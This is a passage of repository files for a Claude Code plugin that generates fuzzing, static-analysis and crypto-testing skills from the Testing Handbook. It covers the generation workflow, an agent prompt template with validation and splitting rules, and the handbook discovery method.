`/fuzzing/techniques/` | Technique Skill | technique-skill.md |\n| `/crypto/[tool]/` | Domain Skill | domain-skill.md |\n| `/web/[tool]/` | Tool Skill | tool-skill.md |\n\n### Skill Candidate Signals\n\n| Signal | Indicates |\n|--------|-----------|\n| `_index.md` with `bookCollapseSection: true` | Major tool/topic |\n| Numbered files (00-, 10-, 20-) | Structured content |\n| `techniques/` subsection | Methodology content |\n| `99-resources.md` or `91-resources.md` | Has external links |\n\n### Exclusion Signals\n\n| Signal | Action |\n|--------|--------|\n| `draft: true` in frontmatter | Skip section |\n| Empty directory | Skip section |\n| Template/placeholder file | Skip section |\n| GUI-only tool (e.g., `web/burp/`) | Skip section (Claude cannot operate GUI tools) |\n\n## Decision Tree\n\n**Starting skill generation?**\n\n```\n Need to analyze handbook and build plan?\n   Read: discovery.md\n     (Handbook analysis methodology, plan format)\n\n Spawning skill generation agents?\n   Read: agent-prompt.md\n     (Full prompt template, variable reference, validation checklist)\n\n Generating a specific skill type?\n   Read appropriate template:\n      Tool (Semgrep, CodeQL)  templates/tool-skill.md\n      Fuzzer (libFuzzer, AFL++)  templates/fuzzer-skill.md\n      Technique (harness, coverage)  templates/technique-skill.md\n      Domain (crypto, web)  templates/domain-skill.md\n\n Validating generated skills?\n   Run: scripts/validate-skills.py\n     Then read: testing.md for activation testing\n\n Finalizing after generation?\n   See: Post-Generation Tasks below\n     (Update main README, update Skills Cross-Reference, self-improvement)\n\n Quick generation from specific section?\n    Use Quick Reference above, apply template directly\n```\n\n## Two-Pass Generation (Phase 3)\n\nGeneration uses a **two-pass approach** to solve forward reference problems (skills referencing other skills that don't exist yet).\n\n### Pass 1: Content Generation (Parallel)\n\nGenerate all skills in parallel **without** the Related Skills section:\n\n```\nPass 1 - Generating 5 skills in parallel:\n Agent 1: libfuzzer (fuzzer)  skills/libfuzzer/SKILL.md\n Agent 2: aflpp (fuzzer)  skills/aflpp/SKILL.md\n Agent 3: semgrep (tool)  skills/semgrep/SKILL.md\n Agent 4: harness-writing (technique)  skills/harness-writing/SKILL.md\n Agent 5: wycheproof (domain)  skills/wycheproof/SKILL.md\n\nEach agent uses: pass=1 (content only, Related Skills left empty)\n```\n\n**Pass 1 agents:**\n- Generate all sections EXCEPT Related Skills\n- Leave a placeholder: `## Related Skills\\n\\n<!-- PASS2: populate after all skills exist -->`\n- Output report includes `references: DEFERRED`\n\n### Pass 2: Cross-Reference Population (Sequential)\n\nAfter all Pass 1 agents complete, run Pass 2 to populate Related Skills:\n\n```\nPass 2 - Populating cross-references:\n Read all generated skill names from skills/*/SKILL.md\n For each skill, determine related skills based on:\n    related_sections from discovery (handbook structure)\n    Skill type relationships (fuzzers  techniques)\n    Explicit mentions in content\n Update each SKILL.md's Related Skills section\n```\n\n**Pass 2 process:**\n1. Collect all generated skill names: `ls -d skills/*/SKILL.md`\n2. For each skill, identify related skills using the mapping from discovery\n3. Edit each SKILL.md to replace the placeholder with actual links\n4. Validate cross-references exist (no broken links)\n\n### Agent Prompt Template\n\nSee **[agent-prompt.md](agent-prompt.md)** for the full prompt template with:\n- Variable substitution reference (including `pass` variable)\n- Pre-write validation checklist\n- Hugo shortcode conversion rules\n- Line count splitting rules\n- Error handling guidance\n- Output report format\n\n### Collecting Results\n\nAfter Pass 1: Aggregate output reports, verify all skills generated.\nAfter Pass 2: Run validator to check cross-references.\n\n### Handling Agent Failures\n\nIf an agent fails or produces invalid output:\n\n| Failure Type | Detection | Recovery Action |\n|--------------|-----------|-----------------|\n| Agent crashed | No output report | Re-run single agent with same inputs |\n| Validation failed | Output report shows errors | Check gaps/warnings, manually patch or re-run |\n| Wrong skill type | Content doesn't match template | Re-run with corrected `type` parameter |\n| Missing content | Output report lists gaps | Accept if minor, or provide additional `related_sections` |\n| Pass 2 broken ref | Validator shows missing skill | Check if skill was skipped, update reference |\n\n**Important:** Do NOT re-run the entire parallel batch for a single agent failure. Fix individual failures independently.\n\n### Single-Skill Regeneration\n\nTo regenerate a single skill without re-running the entire batch:\n\n```\n# Regenerate single skill (Pass 1 - content only)\n\"Use testing-handbook-generator to regenerate the {skill-name} skill from section {section_path}\"\n\n# Example:\n\"Use testing-handbook-generator to regenerate the libfuzzer skill from section fuzzing/c-cpp/10-libfuzzer\"\n```\n\n**Regeneration workflow:**\n1. Re-read the handbook section for fresh content\n2. Apply the appropriate template\n3. Write to `skills/{skill-name}/SKILL.md` (overwrites existing)\n4. Re-run Pass 2 for that skill only to update cross-references\n5. Run validator on the single skill: `uv run scripts/validate-skills.py --skill {skill-name}`\n\n## Output Location\n\nGenerated skills are written to:\n```\nskills/[skill-name]/SKILL.md\n```\n\nEach skill gets its own directory for potential supporting files (as siblings to testing-handbook-generator).\n\n## Quality Checklist\n\nBefore delivering generated skills:\n\n- [ ] All handbook sections analyzed (Phase 1)\n- [ ] Plan presented to user before generation (Phase 2)\n- [ ] Parallel agents launched - one per skill (Phase 3)\n- [ ] Templates applied correctly per skill type\n- [ ] Validator passes: `uv run scripts/validate-skills.py`\n- [ ] Activation testing passed - see [testing.md](testing.md)\n- [ ] Main `README.md` updated with generated skills table\n- [ ] `README.md` Skills Cross-Reference graph updated\n- [ ] Self-improvement notes captured\n- [ ] User notified with summary\n\n## Post-Generation Tasks\n\n### 1. Update Main README\n\nAfter generating skills, update the repository's main `README.md` to list them.\n\n**Format:** Add generated skills to the same \"Available Plugins\" table, directly after `testing-handbook-skills`. Use plain text `testing-handbook-generator` as the author (no link).\n\n**Example:**\n\n```markdown\n| Plugin | Description | Author |\n|--------|-------------|--------|\n| ... other plugins ... |\n| [testing-handbook-skills](plugins/testing-handbook-skills/) | Meta-skill that generates skills from the Testing Handbook | Pawe Patek |\n| [libfuzzer](plugins/testing-handbook-skills/skills/libfuzzer/) | Coverage-guided fuzzing with libFuzzer for C/C++ | testing-handbook-generator |\n| [aflpp](plugins/testing-handbook-skills/skills/aflpp/) | Multi-core fuzzing with AFL++ | testing-handbook-generator |\n| [semgrep](plugins/testing-handbook-skills/skills/semgrep/) | Fast static analysis for finding bugs | testing-handbook-generator |\n```\n\n### 2. Update Skills Cross-Reference\n\nAfter generating skills, update the `README.md`'s **Skills Cross-Reference** section with the mermaid graph showing skill relationships.\n\n**Process:**\n1. Read each generated skill's `SKILL.md` and extract its `## Related Skills` section\n2. Build the mermaid graph with nodes grouped by skill type (Fuzzers, Techniques, Tools, Domain)\n3. Add edges based on the Related Skills relationships:\n   - Solid arrows (`-->`) for primary technique dependencies\n   - Dashed arrows (`-.->`) for alternative tool suggestions\n4. Replace the existing mermaid code block in README.md\n\n**Edge classification:**\n| Relationship | Arrow Style | Example |\n|--------------|-------------|---------|\n| Fuzzer  Technique | `-->` | `libfuzzer --> harness-writing` |\n| Tool  Tool (alternative) | `-.->` | `semgrep -.-> codeql` |\n| Fuzzer  Fuzzer (alternative) | `-.->` | `libfuzzer -.-> aflpp` |\n| Technique  Technique | `-->` | `harness-writing --> coverage-analysis` |\n\n**Validation:** After updating, run `validate-skills.py` to verify all referenced skills exist.\n\n### 3. Self-Improvement\n\nAfter each generation run, reflect on what could improve future runs.\n\n**Capture improvements to:**\n- Templates (missing sections, better structure)\n- Discovery logic (missed patterns, false positives)\n- Content extraction (shortcodes not handled, formatting issues)\n\n**Update process:**\n1. Note issues encountered during generation\n2. Identify patterns that caused problems\n3. Update relevant files:\n   - `SKILL.md` - Workflow, decision tree, quick reference updates\n   - `templates/*.md` - Template improvements\n   - `discovery.md` - Detection logic updates\n   - `testing.md` - New validation checks\n4. Document the improvement in commit message\n\n**Example self-improvement:**\n```\nIssue: libFuzzer skill missing sanitizer flags table\nFix: Updated templates/fuzzer-skill.md to include ## Compiler Flags section\n```\n\n## Example Usage\n\n### Full Discovery and Generation\n\n```\nUser: \"Generate skills from the testing handbook\"\n\n1. Locate handbook (check common locations, ask user, or clone)\n2. Read discovery.md for methodology\n3. Scan handbook at {handbook_path}/content/docs/\n4. Build candidate list with types\n5. Present plan to user\n6. On approval, generate each skill using appropriate template\n7. Validate generated skills\n8. Update main README.md with generated skills table\n9. Update README.md Skills Cross-Reference graph from Related Skills sections\n10. Self-improve: note any template/discovery issues for future runs\n11. Report results\n```\n\n### Single Section Generation\n\n```\nUser: \"Create a skill for the libFuzzer section\"\n\n1. Read /testing-handbook/content/docs/fuzzing/c-cpp/10-libfuzzer/\n2. Identify type: Fuzzer Skill\n3. Read templates/fuzzer-skill.md\n4. Extract content, apply template\n5. Write to skills/libfuzzer/SKILL.md\n6. Validate and report\n```\n\n## Tips\n\n**Do:**\n- Always present plan before generating\n- Use appropriate template for skill type\n- Preserve code blocks exactly\n- Validate after generation\n\n**Don't:**\n- Generate without user approval\n- Skip fetching non-video external resources (use WebFetch)\n- Fetch video URLs (YouTube, Vimeo - titles only)\n- Include handbook images directly\n- Skip validation step\n- Exceed 500 lines per SKILL.md\n\n---\n\n**For first-time use:** Start with [discovery.md](discovery.md) to understand the handbook analysis process.\n\n**For template reference:** See [templates/](templates/) directory for skill type templates.\n\n**For validation:** See [testing.md](testing.md) for quality assurance methodology.\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/agent-prompt.md": "# Agent Prompt Template\n\nUse this prompt when spawning each skill generation agent. Variables in `{braces}` are substituted from the per-skill package (see [discovery.md](discovery.md#phase-3-prepare-generation-context)).\n\n---\n\n# Skill Generation Task\n\nGenerate: **{name}** (type: {type}, pass: {pass})\n\n## Context\n\nYou are generating a Claude Code skill as a sibling to testing-handbook-generator:\n```\nplugins/testing-handbook-skills/skills/\n testing-handbook-generator/   # This generator (do not modify)\n {name}/                       #  Your output directory\n    SKILL.md                  #  Write here\n libfuzzer/                    # Example sibling\n semgrep/                      # Example sibling\n```\n\n## Inputs\n\n| Variable | Value |\n|----------|-------|\n| Handbook section | `{handbook_path}/content/docs/{section_path}/` |\n| Template | `{template_path}` |\n| Related sections | `{related_sections}` |\n| Pass | `{pass}` (1=content generation, 2=cross-references only) |\n\n**Notes:**\n- `related_sections` is a comma-separated list of handbook paths (e.g., `fuzzing/techniques/asan, fuzzing/techniques/harness`), or empty string if none.\n- `pass` determines what to generate: Pass 1 generates all content except Related Skills; Pass 2 only populates Related Skills.\n\n## Process\n\n### Pass 1: Content Generation\n\n1. **Read template first** - defines all required sections\n2. **Read ALL `*.md` files** in the handbook section path\n3. **Read related sections** (if `related_sections` is not empty) for context\n4. **Fetch external resources** with these limits:\n   - Maximum **5 URLs** per skill (prioritize official docs over blogs)\n   - Skip video URLs (YouTube, Vimeo, etc.) - include title/URL only\n   - **30 second timeout** per fetch - skip and note in warnings if timeout\n5. **Check line count** - if content will exceed 450 lines, apply splitting rules (see below)\n6. **Validate before writing** (see checklist below)\n7. **Write SKILL.md** with Related Skills placeholder:\n   ```markdown\n   ## Related Skills\n\n   <!-- PASS2: populate after all skills exist -->\n   ```\n\n### Pass 2: Cross-Reference Population (run after all Pass 1 complete)\n\n1. **List generated skills**: Read all `skills/*/SKILL.md` files to get skill names\n2. **Determine related skills** for this skill based on:\n   - `related_sections` mapping (handbook structure  skill names)\n   - Skill type relationships (e.g., fuzzers typically relate to technique skills)\n   - Explicit mentions in the skill's content\n3. **Replace the placeholder** with actual Related Skills section\n4. **Validate** that all referenced skills exist\n\n## Pre-Write Validation Checklist\n\n### Pass 1 Checklist\n\nBefore writing SKILL.md, verify ALL items:\n\n- [ ] **Line count**: Content will be under 500 lines (if >450, apply splitting rules)\n- [ ] **No shortcodes**: No `{{<` or `{{% ` patterns remain in output\n- [ ] **No escaped backticks**: No `\\``` ` patterns remain (should be unescaped to ` ``` `)\n- [ ] **Required section**: Has `## When to Use` heading\n- [ ] **Trigger phrase**: Description contains \"Use when\" or \"Use for\"\n- [ ] **Code preserved**: All code blocks have language specifier and exact content\n- [ ] **Related Skills placeholder**: Has `## Related Skills` with `<!-- PASS2: ... -->` comment\n\nIf any check fails, fix before writing. If unfixable (e.g., source has no code), note in warnings.\n\n### Pass 2 Checklist\n\nBefore updating Related Skills section:\n\n- [ ] **All referenced skills exist**: Each skill name in Related Skills has a corresponding `skills/{name}/SKILL.md`\n- [ ] **No circular-only references**: Don't list only skills that reference this skill back\n- [ ] **Appropriate skill types**: Fuzzers link to techniques; techniques link to tools/fuzzers\n\n## Critical Rules\n\n**Template backtick escaping:**\n\nTemplates use `\\``` ` (backslash-escaped backticks) to show code block examples within markdown code blocks. When generating skills:\n- Convert `\\``` `  ` ``` ` (remove the backslash escape)\n- This applies to all code fence markers in the \"Template Structure\" sections\n- Example: `\\```bash` in template becomes ` ```bash` in generated skill\n\n**Hugo shortcode conversion:**\n\n| From | To |\n|------|-----|\n| `{{< hint info >}}X{{< /hint >}}` | `> **Note:** X` |\n| `{{< hint warning >}}X{{< /hint >}}` | `> **Warning:** X` |\n| `{{< hint danger >}}X{{< /hint >}}` | `> ** Danger:** X` |\n| `{{< tabs >}}{{< tab \"Y\" >}}X{{< /tab >}}{{< /tabs >}}` | `### Y` followed by X |\n| `{{% relref \"path\" %}}` | `See: path` (plain text) |\n| `{{< customFigure \"...\" >}}` | `(See handbook diagram)` |\n| `{{< mermaid >}}X{{< /mermaid >}}` | Omit (describe diagram in text if critical) |\n| `{{< details \"title\" >}}X{{< /details >}}` | `<details><summary>title</summary>X</details>` |\n| `{{< expand \"title\" >}}X{{< /expand >}}` | `<details><summary>title</summary>X</details>` |\n| `{{< figure src=\"...\" >}}` | `(See handbook image: filename)` |\n| `{{< youtube ID >}}` | `[Video: Title](https://youtube.com/watch?v=ID)` (title only) |\n| `{{< vimeo ID >}}` | `[Video: Title](https://vimeo.com/ID)` (title only) |\n| `{{< button href=\"URL\" >}}X{{< /button >}}` | `[X](URL)` |\n| `{{< columns >}}X{{< /columns >}}` | Remove wrapper, keep content X |\n| `{{< katex >}}X{{< /katex >}}` | `$X$` (inline math) or omit if complex |\n\n**Preserve exactly:** Code blocks (language specifier, indentation, full content)\n\n**Omit:** Images (reference as: `See handbook diagram: filename.svg`), video content (title/URL only)\n\n**YAML frontmatter:**\n- `name`: lowercase, `[a-z0-9-]+`, max 64 chars\n- `type`: one of `tool`, `fuzzer`, `technique`, `domain` (determines required sections)\n- `description`: max 1024 chars, MUST include \"Use when {trigger}\" or \"Use for {purpose}\"\n\n## Error Handling\n\n| Situation | Action |\n|-----------|--------|\n| Missing handbook content | Note gap in report, use template placeholder |\n| WebFetch timeout (>30s) | Include URL without summary, note in warnings |\n| WebFetch fails | Include URL without summary, note in warnings |\n| Over 450 lines in draft | Apply Line Count Splitting Rules (see below) |\n| Missing resources file | Omit Resources section, note in report |\n| No related sections (`related_sections` is empty) | Leave Related Skills placeholder for Pass 2 |\n\n## Line Count Splitting Rules\n\n**Hard limit:** 500 lines per file. **Soft limit:** 450 lines (triggers splitting).\n\n### When to Split\n\nAfter drafting content, count lines. If **line count > 450**:\n\n1. **Identify split candidates** (sections that can stand alone):\n\n   | Section | Split Priority | Typical Lines |\n   |---------|---------------|---------------|\n   | Installation | High | 50-100 |\n   | Advanced Usage | High | 80-150 |\n   | CI/CD Integration | High | 60-100 |\n   | Troubleshooting | Medium | 40-80 |\n   | Configuration | Medium | 50-100 |\n   | Tool-Specific Guidance | Medium | 100-200 |\n\n2. **Calculate what to extract:** Remove sections until SKILL.md is under 400 lines (leaving room for decision tree).\n\n### How to Split\n\n**Step 1:** Create file structure:\n```\nskills/{name}/\n SKILL.md           # Core content + decision tree (target: <400 lines)\n installation.md    # If extracted\n advanced.md        # If extracted\n ci-integration.md  # If extracted\n troubleshooting.md # If extracted\n```\n\n**Step 2:** Transform SKILL.md into a router. Add decision tree after Quick Reference:\n```markdown\n## Decision Tree\n\n**What do you need?**\n\n First time setup?\n   Read: [Installation Guide](installation.md)\n\n Basic usage?\n   See: Quick Reference above\n\n Advanced features?\n   Read: [Advanced Usage](advanced.md)\n\n CI/CD integration?\n   Read: [CI Integration](ci-integration.md)\n\n Something not working?\n    Read: [Troubleshooting](troubleshooting.md)\n```\n\n**Step 3:** Each extracted file gets minimal frontmatter:\n```yaml\n---\nparent: {name}\ntitle: Installation Guide\n---\n```\n\n### What to Keep in SKILL.md\n\nAlways keep in SKILL.md (never extract):\n- YAML frontmatter (name, type, description)\n- When to Use section\n- Quick Reference section\n- Decision Tree (add if splitting)\n- Related Skills section (placeholder for Pass 2)\n\n### Splitting Decision Table\n\n| Total Lines | Action |\n|-------------|--------|\n| 400 | No split needed |\n| 401-450 | Review for optional trimming, no split required |\n| 451-550 | Extract 1-2 largest sections |\n| 551-700 | Extract 2-3 sections |\n| >700 | Extract all optional sections, review for content reduction |\n\n### Example Split\n\n**Before (520 lines):**\n```\nSKILL.md\n Frontmatter (10 lines)\n When to Use (30 lines)\n Quick Reference (40 lines)\n Installation (90 lines)       Extract\n Core Workflow (80 lines)\n Advanced Usage (120 lines)    Extract\n CI/CD Integration (70 lines)  Extract\n Common Mistakes (30 lines)\n Related Skills (20 lines)\n Resources (30 lines)\n```\n\n**After split:**\n```\nSKILL.md (280 lines)\n Frontmatter (10 lines)\n When to Use (30 lines)\n Quick Reference (40 lines)\n Decision Tree (40 lines)      Added\n Core Workflow (80 lines)\n Common Mistakes (30 lines)\n Related Skills (20 lines)\n Resources (30 lines)\n\ninstallation.md (90 lines)\nadvanced.md (120 lines)\nci-integration.md (70 lines)\n```\n\n## Scope Restriction\n\nONLY write to: `{output_dir}/{name}/`\nDo NOT read/modify other plugins, skills, or testing-handbook-generator itself.\n\n## Output Report\n\nAfter writing, output this report (used for orchestration and cross-reference tracking):\n\n### Pass 1 Report\n```\n## {name} (Pass 1)\n- **Lines:** {count}\n- **Split:** {Yes - files listed | No}\n- **Sections:** {populated sections, comma-separated}\n- **Gaps:** {missing template sections, or \"None\"}\n- **Warnings:** {issues encountered, or \"None\"}\n- **References:** DEFERRED (Pass 2)\n```\n\n### Pass 2 Report\n```\n## {name} (Pass 2)\n- **References:** {skill names in Related Skills section, comma-separated}\n- **Broken refs:** {skill names that don't exist, or \"None\"}\n```\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/discovery.md": "# Discovery Workflow\n\nMethodology for analyzing the Testing Handbook and identifying skill candidates.\n\n**Quick Navigation:**\n- [Phase 0: Locate Handbook](#phase-0-locate-handbook)\n- [Phase 1: Handbook Analysis](#phase-1-handbook-analysis)\n- [Phase 2: Plan Generation](#phase-2-plan-generation)\n- [Phase 3: Prepare Generation Context](#phase-3-prepare-generation-context)\n\n## Progress Tracking\n\nUse TodoWrite throughout discovery to track progress and give visibility to the user:\n\n```\nDiscovery phase todos:\n- [ ] Locate handbook repository\n- [ ] Scan /fuzzing/ sections\n- [ ] Scan /static-analysis/ sections\n- [ ] Scan /crypto/ sections\n- [ ] Scan /web/ sections\n- [ ] Build candidate list with types\n- [ ] Resolve conflicts and edge cases\n- [ ] Present plan to user\n- [ ] Await user approval\n```\n\nMark each todo as `in_progress` when starting and `completed` when done. This helps users understand where you are in the process.\n\n## Phase 0: Locate Handbook\n\nBefore analysis, locate or obtain the Testing Handbook repository.\n\n### Step 1: Check Common Locations\n\n```bash\n# Check common locations (simple version)\nfor dir in ./testing-handbook ../testing-handbook ~/testing-handbook; do\n  [ -d \"$dir/content/docs\" ] && handbook_path=\"$dir\" && echo \" Found: $dir\" && break\ndone\n[ -z \"$handbook_path\" ] && echo \"Handbook not found in common locations\"\n```\n\n### Step 2: Ask User (if not found)\n\nIf handbook not found in common locations:\n> \"Where is the Testing Handbook repository located? (full path)\"\n\n### Step 3: Clone as Last Resort (if user agrees)\n\n```bash\ngit clone --depth=1 https://github.com/trailofbits/testing-handbook.git\nhandbook_path=\"./testing-handbook\"\n```\n\n### Set handbook_path Variable\n\nOnce located, set `handbook_path` and use it for all subsequent paths:\n```bash\nhandbook_path=\"/path/to/testing-handbook\"  # Set to actual location\n```\n\nAll paths below are relative to `{handbook_path}`.\n\n### Error Recovery\n\n| Failure | Detection | Recovery |\n|---------|-----------|----------|\n| Handbook not in common locations | Step 1 finds nothing | Ask user for path (Step 2) |\n| User doesn't know path | User says \"I don't know\" | Offer to clone (Step 3) |\n| Clone fails (network/permissions) | git clone returns error | Report error, ask user to clone manually and provide path |\n| `content/docs/` missing | Directory doesn't exist after locating | Invalid handbook - ask user to verify it's the correct repo |\n| Handbook is outdated | User mentions old content | Suggest `git pull` in handbook directory |\n\n## Phase 1: Handbook Analysis\n\n### 1.1 Scan Directory Structure\n\nScan the handbook at:\n```\n{handbook_path}/content/docs/\n```\n\nDirectory structure pattern:\n```\ndocs/\n fuzzing/\n    _index.md              # Section overview\n    c-cpp/\n       _index.md          # Language subsection\n       10-libfuzzer/      # Tool directory\n          index.md\n       11-aflpp/\n       techniques/        # Shared techniques\n    rust/\n static-analysis/\n    semgrep/\n       _index.md\n       00-installation.md\n       10-advanced.md\n       20-ci.md\n       99-resources.md\n    codeql/\n crypto/\n    wycheproof/\n    constant_time_tool/\n web/\n     burp/\n```\n\n### 1.2 Parse Frontmatter\n\nEach markdown file has YAML frontmatter:\n\n```yaml\n---\ntitle: \"Semgrep\"\nweight: 2\nsummary: \"Fast static analysis for finding bugs...\"\nbookCollapseSection: true\ndraft: false                    # Check this!\n---\n```\n\n**Key fields:**\n| Field | Purpose |\n|-------|---------|\n| `title` | Skill name candidate |\n| `summary` | Skill description source |\n| `weight` | Ordering (lower = more important) |\n| `bookCollapseSection` | Indicates major section |\n| `draft` | If `true`, skip this section |\n\n### 1.3 Identify Skill Candidates\n\n**Decision Table:**\n\nFor each directory found, apply the first matching rule:\n\n| Directory Pattern | Has | Skill Type | Action |\n|-------------------|-----|------------|--------|\n| `_index.md` with `bookCollapseSection: true` | - | Container | Scan children, don't create skill for container itself |\n| `**/static-analysis/[name]/` | Numbered files (00-, 10-) | Tool | Create tool skill |\n| `**/fuzzing/[lang]/[name]/` | `index.md` or numbered files | Fuzzer | Create fuzzer skill |\n| `**/fuzzing/techniques/[name]/` | Any `.md` files | Technique | Create technique skill |\n| `**/crypto/[name]/` | Any `.md` files | Domain | Create domain skill |\n| `**/web/[name]/` | Numbered files or `_index.md` | Tool | Create tool skill (but check exclusions) |\n| Named `techniques/` | Subdirectories | Container | Create one technique skill per subdirectory |\n| Any other | Only `_index.md` | Skip | Not enough content |\n\n**Hard Exclusions (GUI-only tools):**\n\nSome handbook sections describe tools that require graphical user interfaces and cannot be operated by Claude. Skip these unconditionally:\n\n| Section | Tool | Reason |\n|---------|------|--------|\n| `**/web/burp/` | Burp Suite | GUI-based HTTP proxy; requires visual interaction |\n\nThese tools are excluded because Claude cannot:\n- Launch or interact with GUI applications\n- Click buttons, navigate menus, or view visual elements\n- Operate browser-based or desktop UI tools\n\nFor web security testing, prefer CLI-based alternatives documented elsewhere (e.g., `curl`, `httpie`, custom scripts).\n\n**Classification priority** (when multiple patterns match):\n1. Most specific path wins (deeper = higher priority)\n2. Type preference: Tool > Fuzzer > Technique > Domain\n3. When in doubt, flag for user review in the plan\n\n**Examples:**\n\n| Path | Matches | Result |\n|------|---------|--------|\n| `/fuzzing/c-cpp/10-libfuzzer/` | Fuzzer pattern | `libfuzzer` (fuzzer) |\n| `/static-analysis/semgrep/` | Tool pattern | `semgrep` (tool) |\n| `/fuzzing/techniques/writing-harnesses/` | Technique pattern | `harness-writing` (technique) |\n| `/crypto/wycheproof/` | Domain pattern | `wycheproof` (domain) |\n\n### 1.4 Build Candidate List\n\nFor each candidate, extract:\n\n```yaml\n- name: libfuzzer\n  type: fuzzer\n  source: /docs/fuzzing/c-cpp/10-libfuzzer/\n  summary: \"libFuzzer is a coverage-guided fuzzer...\"\n  weight: 1\n  has_resources: true           # Has 99-resources.md\n  related_sections:\n    - /docs/fuzzing/techniques/01-writing-harnesses/\n    - /docs/fuzzing/techniques/03-asan/\n```\n\n### 1.5 Candidate Prioritization\n\nWhen many candidates exist, prioritize by:\n\n| Priority | Criterion | Rationale |\n|----------|-----------|-----------|\n| 1 | Weight field (lower = higher) | Handbook author's intent |\n| 2 | Content depth (more numbered files) | More complete documentation |\n| 3 | Has resources file | External links add value |\n| 4 | Core section (fuzzing, static-analysis) | Fundamental topics |\n| 5 | Recently updated | More relevant content |\n\n**Conflict resolution:**\n- If multiple patterns match a section, use the **most specific** (deepest path wins)\n- If a section could be multiple types, prefer: Tool > Fuzzer > Technique > Domain\n- When in doubt, flag for user review in the plan\n\n## Phase 2: Plan Generation\n\n### 2.1 Plan Format\n\nPresent to user in this format:\n\n```markdown\n# Skill Generation Plan\n\n## Summary\n- **Handbook analyzed:** {handbook_path}\n- **Total sections:** 25\n- **Skills to generate:** 8\n- **Sections to skip:** 2\n\n---\n\n## Skills to Generate\n\n| # | Skill Name | Source Section | Type | Related Sections |\n|---|------------|----------------|------|------------------|\n| 1 | libfuzzer | /fuzzing/c-cpp/10-libfuzzer/ | Fuzzer | techniques/asan, techniques/harness |\n| 2 | aflpp | /fuzzing/c-cpp/11-aflpp/ | Fuzzer | techniques/asan |\n| 3 | cargo-fuzz | /fuzzing/rust/10-cargo-fuzz/ | Fuzzer | - |\n| 4 | wycheproof | /crypto/wycheproof/ | Domain | - |\n| 5 | fuzz-harness-writing | /fuzzing/techniques/01-writing-harnesses/ | Technique | - |\n| 6 | coverage-analysis | /fuzzing/c-cpp/techniques/01-coverage/ | Technique | - |\n| 7 | address-sanitizer | /fuzzing/techniques/03-asan/ | Technique | - |\n\n---\n\n## Skipped Sections\n\n| Section | Reason |\n|---------|--------|\n| /docs/dynamic-analysis/ | `draft: true` in frontmatter |\n| /docs/fuzzing/3-python.md | Single file, insufficient content |\n| /docs/web/burp/ | GUI-only tool (excluded) |\n\n---\n\n## External Resources to Fetch\n\n| Section | Resource Count | Source File |\n|---------|---------------|-------------|\n| Fuzzing | 5 | /fuzzing/91-resources.md |\n| Semgrep | 3 | /static-analysis/semgrep/99-resources.md |\n| CodeQL | 4 | /static-analysis/codeql/99-resources.md |\n\n---\n\n## Actions\n\n- [ ] Confirm plan and proceed with generation\n- [ ] Modify: Remove skill #X from plan\n- [ ] Modify: Change skill #Y type\n- [ ] Cancel generation\n```\n\nMake the actions navigable and selectable if possible using built-in tool like TodoWrite. \n\n### 2.2 User Interaction\n\nAfter presenting plan:\n\n1. Wait for user confirmation or modifications\n2. Apply any modifications to plan\n3. Proceed with generation only after explicit approval\n\n**Acceptable modifications:**\n- Remove skills from plan\n- Change skill type\n- Skip updates\n- Add custom related sections\n- Change skill names\n\n## Phase 3: Prepare Generation Context\n\nThis phase prepares everything needed for generation agents. It combines content aggregation with agent handoff preparation.\n\n### 3.1 Collect Content Per Skill\n\nFor each approved skill, collect content from:\n\n1. **Primary section:** Main `_index.md` or `index.md`\n2. **Numbered files:** `00-installation.md`, `10-advanced.md`, etc.\n3. **Related sections:** As specified in `related_sections`\n4. **Resources:** From `99-resources.md` (titles only)\n\n### 3.2 Content Processing Rules\n\nContent processing rules are defined in the agent prompt template.\n\n**Authoritative source:** [agent-prompt.md](agent-prompt.md#critical-rules)\n\nThe agent prompt contains:\n- Hugo shortcode conversion table\n- Code block preservation rules\n- Image/video handling\n- YAML frontmatter requirements\n- Pre-write validation checklist\n- **Line count splitting rules** (when to split large skills)\n\nDo not duplicate these rules here. Generation agents receive them via the prompt template.\n\n### 3.3 External Resources\n\nExtract from `99-resources.md` or `91-resources.md`:\n\n```markdown\n## Resources\n\n- [Introduction to Semgrep](https://www.youtube.com/watch?v=...) - Trail of Bits Webinar\n- [Semgrep Documentation](https://semgrep.dev/docs/) - Official docs\n- [Custom Rules Guide](https://semgrep.dev/docs/writing-rules/) - Rule authoring\n```\n\n**For non-video resources (documentation, blogs, guides):**\n- Use WebFetch to retrieve content\n- Extract key insights, techniques, code examples\n- Summarize actionable information for the skill\n- Include attribution with URL\n\n**For video resources (YouTube, Vimeo, etc.):**\n- Extract title and URL only\n- Do NOT attempt to fetch video content\n- Include brief description if available in handbook\n\n**Video URL patterns to skip fetching:**\n- `youtube.com`, `youtu.be`\n- `vimeo.com`\n- `*.mp4`, `*.webm`, `*.mov` direct links\n- `twitch.tv`, `dailymotion.com`\n\n### 3.4 Edge Case Handling\n\n| Situation | Detection | Action |\n|-----------|-----------|--------|\n| Empty handbook section | Directory exists but no `.md` files | Skip, add to \"Skipped Sections\" with reason |\n| Draft content | `draft: true` in frontmatter | Skip entirely, do not include in plan |\n| Missing `_index.md` | Directory has content but no index | Use first numbered file for metadata |\n| Conflicting frontmatter | Different titles in `_index.md` vs content | Use `_index.md` values, note discrepancy |\n| Missing resources file | No `99-resources.md` or `91-resources.md` | Omit Resources section from generated skill |\n| Circular references | Section A references B, B references A | Include each once, note relationship |\n| Very large section | >20 markdown files | Flag for splitting (see agent-prompt.md) |\n| Incomplete section | `TODO` or placeholder text | Flag in plan for user decision |\n\n### 3.5 Build Per-Skill Package\n\nEach skill generation agent receives variables that map directly to the agent prompt template:\n\n```yaml\n# Agent prompt variables (see agent-prompt.md for full template)\nname: \"libfuzzer\"                              # {name} - skill name (lowercase)\ntype: \"fuzzer\"                                 # {type} - tool|fuzzer|technique|domain\npass: 1                                        # {pass} - 1=content only, 2=cross-refs only\nhandbook_path: \"/path/to/testing-handbook\"     # {handbook_path} - absolute path\nsection_path: \"fuzzing/c-cpp/10-libfuzzer\"     # {section_path} - relative to content/docs/\noutput_dir: \"/path/to/skills/plugins/testing-handbook-skills/skills\"  # {output_dir}\ntemplate_path: \"skills/testing-handbook-generator/templates/fuzzer-skill.md\"  # {template_path}\nrelated_sections: \"fuzzing/techniques/01-writing-harnesses, fuzzing/techniques/03-asan\"\n# ^ Use comma-separated list OR empty string \"\" if no related sections\n\n# Metadata (for orchestrator tracking, not passed to agent)\nmetadata:\n  title: \"libFuzzer\"                           # From frontmatter\n  summary: \"Coverage-guided 